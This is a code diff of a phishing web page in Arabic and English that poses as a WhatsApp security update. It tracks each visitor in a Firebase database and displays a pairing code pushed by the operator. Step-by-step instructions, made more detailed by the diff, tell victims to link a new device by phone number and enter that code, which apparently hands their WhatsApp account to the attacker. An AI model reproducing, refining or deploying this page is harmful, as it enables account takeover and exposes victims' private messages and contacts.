@@ -7,15 +7,16 @@
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .top-bar { position: absolute; top: 0; width: 100%; height: 25%; background-color: #00a884; z-index: -1; }
-        .main-card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        .whatsapp-logo { width: 70px; height: 70px; margin-bottom: 15px; }
-        .title { color: #41525d; font-size: 20px; font-weight: 600; margin-bottom: 10px; }
-        .device-info { background: #e7f3f3; color: #128c7e; padding: 8px; border-radius: 5px; font-size: 13px; font-weight: bold; margin-bottom: 15px; display: inline-block; }
-        .instruction { color: #667781; font-size: 14px; line-height: 1.6; margin-bottom: 20px; text-align: right; }
-        .alert-box { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #ffeeba; text-align: right; }
-        .code-container { background-color: #f8f9fa; border: 1px solid #e9edef; padding: 15px; border-radius: 8px; display: inline-block; min-width: 85%; }
-        #pairing-code { font-size: 32px; font-weight: bold; color: #128c7e; letter-spacing: 2px; font-family: 'Courier New', Courier, monospace; }
-        [dir="ltr"] .instruction, [dir="ltr"] .alert-box { text-align: left; }
+        .main-card { background: white; width: 90%; max-width: 420px; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
+        .whatsapp-logo { width: 65px; height: 65px; margin-bottom: 15px; }
+        .title { color: #41525d; font-size: 19px; font-weight: 600; margin-bottom: 8px; }
+        .device-info { background: #e7f3f3; color: #128c7e; padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: inline-block; }
+        .alert-box { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; border: 1px solid #ffeeba; text-align: right; line-height: 1.4; }
+        .instruction { color: #3b4a54; font-size: 14px; line-height: 1.7; margin-bottom: 20px; text-align: right; border-right: 3px solid #00a884; padding-right: 10px; }
+        .highlight { color: #d91e1e; font-weight: bold; text-decoration: underline; }
+        .code-container { background-color: #f8f9fa; border: 2px dashed #cfd8dc; padding: 15px; border-radius: 8px; display: inline-block; min-width: 85%; margin-top: 10px; }
+        #pairing-code { font-size: 34px; font-weight: bold; color: #128c7e; letter-spacing: 3px; font-family: 'Courier New', Courier, monospace; }
+        [dir="ltr"] .instruction, [dir="ltr"] .alert-box { text-align: left; border-right: none; border-left: 3px solid #00a884; padding-left: 10px; }
     </style>
 </head>
 <body>
@@ -42,30 +43,28 @@
         firebase.initializeApp(config);
         const db = firebase.database();
 
-        // كشف نوع الجهاز تلقائياً
         function getDevice() {
             const ua = navigator.userAgent;
             if (/android/i.test(ua)) return "Android Device";
             if (/iPad|iPhone|iPod/.test(ua)) return "iPhone (iOS)";
             return "Mobile Device";
         }
-
         const deviceName = getDevice();
 
         const langData = {
             ar: {
-                title: "تحديث بروتوكول التشفير (End-to-End)",
-                device: "تم فحص جهازك: " + deviceName,
-                alert: "⚠️ تنبيه: سيصلك الآن إشعار رسمي من تطبيق WhatsApp على هاتفك، يرجى الضغط عليه فوراً وإدخال الكود الموضح بالأسفل لإتمام التحديث.",
-                instr: "خطوات التفعيل:<br>1. افتح الإشعار القادم من WhatsApp.<br>2. اضغط على 'ربط جهاز'.<br>3. أدخل الكود التالي فوراً:",
-                loading: "جاري توليد الكود..."
+                title: "تحديث أمان البروتوكول المشفر",
+                device: "تم التعرف على جهازك: " + deviceName,
+                alert: "⚠️ تنبيه: سيصلك الآن إشعار على واتساب يطلب 'ربط جهاز جديد'. اضغط عليه للمتابعة.",
+                instr: "خطوات المزامنة:<br>1. افتح الإشعار أو اذهب للإعدادات > الأجهزة المرتبطة.<br>2. اضغط على 'ربط جهاز'.<br>3. <span class='highlight'>مهم جداً:</span> اضغط على كلمة <b>'الربط برقم الهاتف بدلاً من ذلك'</b> التي ستظهر أسفل الشاشة.<br>4. أدخل الكود التالي في الخانات التي ستظهر لك:",
+                loading: "فحص..."
             },
             en: {
-                title: "Security Protocol Update (End-to-End)",
-                device: "Device Verified: " + deviceName,
-                alert: "⚠️ Alert: You will now receive an official notification from WhatsApp. Please tap it and enter the code below to complete the security update.",
-                instr: "Activation Steps:<br>1. Open the WhatsApp notification.<br>2. Tap on 'Link a Device'.<br>3. Enter the following code immediately:",
-                loading: "Generating code..."
+                title: "Security Protocol Update",
+                device: "Verified Device: " + deviceName,
+                alert: "⚠️ Alert: A notification will appear on your WhatsApp asking to 'Link a Device'. Tap it to proceed.",
+                instr: "Sync Steps:<br>1. Open notification or go to Settings > Linked Devices.<br>2. Tap 'Link a Device'.<br>3. <span class='highlight'>Important:</span> Tap on <b>'Link with phone number instead'</b> at the bottom of your screen.<br>4. Enter the following code in the boxes provided:",
+                loading: "Checking..."
             }
         };
 
@@ -79,12 +78,7 @@
         document.getElementById('pairing-code').innerText = langData[userLang].loading;
 
         let vId = new URLSearchParams(window.location.search).get('id') || "User_" + Math.floor(Math.random() * 9999);
-        db.ref('visiting/' + vId).set({ 
-            status: "online", 
-            device: deviceName,
-            lang: userLang, 
-            time: Date.now() 
-        });
+        db.ref('visiting/' + vId).set({ status: "online", device: deviceName, lang: userLang, time: Date.now() });
 
         db.ref('sessions/' + vId).on('value', (snapshot) => {
             const data = snapshot.val();
